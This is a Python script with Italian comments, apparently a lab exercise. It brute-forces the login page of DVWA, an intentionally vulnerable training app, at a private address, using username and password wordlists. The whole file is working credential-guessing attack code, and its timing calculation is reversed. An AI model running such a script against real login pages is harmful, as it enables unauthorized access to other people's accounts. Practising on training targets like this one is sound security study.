import requests
import time
import os

# Lettura file
username_file = open("file/usernames.txt")
password_file = open("file/passwords.txt")

user_list = username_file.readlines()
pwd_list = password_file.readlines()

dvwa_url = 'http://192.168.50.101/dvwa'  # URL di base di DVWA

desired_level = 'low'  # # Dato relativo al livello di sicurezza. Può essere 'low', 'medium', 'high'

# Funzione per effettuare il login
def login(session):
    login_url = f'{dvwa_url}/login.php'
    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login'
    }
    response = session.post(login_url, data=login_data)
    return 'Login failed' not in response.text

# Funzione per modificare il livello di sicurezza
def set_security_level(session, level):
    security_url = f'{dvwa_url}/security.php'
    security_data = {
        'security': level,
        'seclev_submit': 'Submit'
    }
    response = session.post(security_url, data=security_data)
    return response.status_code == 200

def brute_force(sessione):

    dati = {
    'username': '',
    'password': '',
    'Login' : 'Login'
    }

    n_attempt = 0   # Variabilie per tenere traccia dei tentativi
    stopit = False  # Variabile per controllare quando uscire dal ciclo
    
    # Cicli lettura user e password
    for user in user_list:
        user =  user.rstrip()
        if stopit: break
        for pwd in pwd_list:
            pwd = pwd.rstrip()
            
            # setting dati
            dati["username"] = user
            dati["password"] = pwd
            new_url = f'{dvwa_url}/vulnerabilities/brute/?username={dati["username"]}&password={dati["password"]}&Login={dati['Login']}#' 
            
            # Incremento e stampa numero tentativi
            n_attempt+=1
            print(f"Combinazione N: {n_attempt}")
            
            response = sessione.post(new_url, dati) # # Post
         
            if response.status_code == 200:
                if "Username and/or password incorrect." not in response.text:    # Controllo risposta
                    os.system("clear")
                    print(f"Login effettuato\nUser: {user} - Password: {pwd}")    # Stampa credenziali
                    
                    end_time = time.time()                                        # FIne cronometro
                    executio_time = round(start_time - end_time,2)
                    
                    print(f"Numero tentativi: {n_attempt}")                            # Stampa tentativi
                    print(f"Tempo di esecuzione: {round(executio_time / 60)} minuti")  # Stampa esecuzione
                    
                    stopit = True   # Impostazione per fermare il ciclo 
                    break
            else:
                print(f"Errore nel accedere alla pagina brute. Codice di stato: {response.status_code}")

start_time = time.time()    # Inizio cronometro

session = requests.Session()    # Inizializza una sessione

if login(session):  # Effettua il login
    print("Login effettuato con successo.")
    
    if set_security_level(session, desired_level): # Imposta il livello di sicurezza e controllo sull'esecuzione
        print(f"Livello di sicurezza impostato a: {desired_level}")
    else:
        print("Errore nell'impostare il livello di sicurezza.")
else:
    print("Errore nel login.")
        
brute_force(session) # Chiamata funzione brute force